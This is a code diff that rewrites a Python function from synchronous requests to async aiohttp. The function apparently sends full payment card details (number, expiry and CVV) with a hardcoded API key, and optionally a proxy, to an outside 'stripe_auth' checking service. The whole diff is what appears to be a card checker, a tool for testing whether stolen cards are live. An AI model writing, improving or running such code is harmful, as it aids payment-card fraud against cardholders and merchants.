@@ -1,22 +1,27 @@
-import requests
+import aiohttp
+import asyncio
 
-def auth_func(_, cc, cvv, mes, ano):
-    session = requests.Session()
-    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
+async def async_auth_func(card: str, proxy: str = None):
+    url = "https://barryxapi.xyz/str_auth"
+    params = {
+        "key": "BRY-HEIQ7-KPWYR-DRU67",
+        "card": card
+    }
+    if proxy:
+        params["proxy"] = proxy
 
     try:
-        url = "https://barryxapi.xyz/stripe_auth"
-        key = "BRY-FGKD5-MDYRI-56HDM"
-        response = session.get(f"{url}?key={key}&card={fullcc}", timeout=15)
-
-        if response.status_code == 200:
-            data = response.json()
-            result = data.get("result", {})
-            status = result.get("status", "❓")
-            msg = result.get("message", "No message")
-            return {"status": status, "response": msg}
-        else:
-            return {"status": "Error", "response": f"HTTP {response.status_code}"}
-
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, params=params, timeout=20) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    return {
+                        "status": data.get("status", "error"),
+                        "response": data.get("message", "Unknown response")
+                    }
+                else:
+                    return {"status": "error", "response": f"HTTP {response.status}"}
+    except asyncio.TimeoutError:
+        return {"status": "error", "response": "Request Timeout"}
     except Exception as e:
-        return {"status": "Error", "response": str(e)}
+        return {"status": "error", "response": str(e)}
